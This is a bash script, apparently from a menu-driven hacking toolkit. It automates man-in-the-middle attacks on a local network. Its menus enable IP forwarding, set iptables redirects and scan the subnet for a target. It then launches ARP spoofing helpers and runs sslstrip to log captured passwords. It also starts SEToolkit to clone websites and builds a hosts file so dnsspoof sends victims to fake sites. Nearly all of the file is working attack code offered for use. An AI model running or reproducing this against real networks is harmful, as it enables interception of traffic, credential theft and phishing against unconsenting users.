#! /bin/bash
VERSION=2.1.4
#Number of tools with keyboard shortcut support
HOWMANYTOOLS=47
BACKL="0"
DONATIONS=5
LATESTCHANGELOGLINES=30

function mitm_menu
{
clear
TERMINALTITLE="MITM"
dash_calc
printf '\033]2;MITM\a'
echo -e ""$YS" 1"$CE") Password sniff-sslstrip"
echo -e ""$YS" 2"$CE") SET + mitm + dnsspoofing"
echo -e ""$YS" b"$CE") Go back"
echo -e ""$YS" 0"$CE") EXIT"
read MITMATT
clear
if [[ "$MITMATT" = "1" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward "
	echo -e ""$YS" 2"$CE") Set iptables"
	echo -e ""$YS" 3"$CE") Scan and select target IP         "$YS"33"$CE") I have scaned"
	echo -e ""$YS" 4"$CE") Open the sslstrip log"            # "$YS"44"$CE") Filter credentials"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMCH
	if [[ "$MITMCH" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "2" ]]
	then
		clear
		echo -e "Redirect tcp port 80 to port("$YS"Enter"$CE"=8080):"
		read PORTTCP
		if [[ "$PORTTCP" = "" ]]
		then
			PORTTCP="8080"
		fi
					clear
		echo -e "Redirect udp port 40 to port("$YS"Enter"$CE"=40):"
		read PORTUDP
		if [[ "$PORTUDP" = "" ]]
		then
			PORTUDP="40"
		fi
		iptables --flush
		iptables --flush -t nat
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP
		iptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP
		echo -e "Done."
		sleep 1
	elif [[ "$MITMCH" = "3" ]]
	then
		clear
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway(prefer "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi	
		while true
		do	
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP:"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Enter your gateway(prefer "$ETH" gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"="$ETH"):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="$ETH"
		fi
		clear
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
	echo -e ""$YS" 3"$CE") Start ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e ""$YS" 4"$CE") Start SEToolkit"
	echo -e ""$YS" 5"$CE") Start DNSspoofing"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		clear
		echo -e "Enter your target IP:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Clone a website to one of the following IP(s):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Making you a hosts.txt file"
		echo -e ""
		echo -e "Enter your IP address that you started the server:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Enter the interface of that IP(e.g: wlan0):"
		read -e INTIP
		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Add another one as well?"$YNYES""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Starting dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi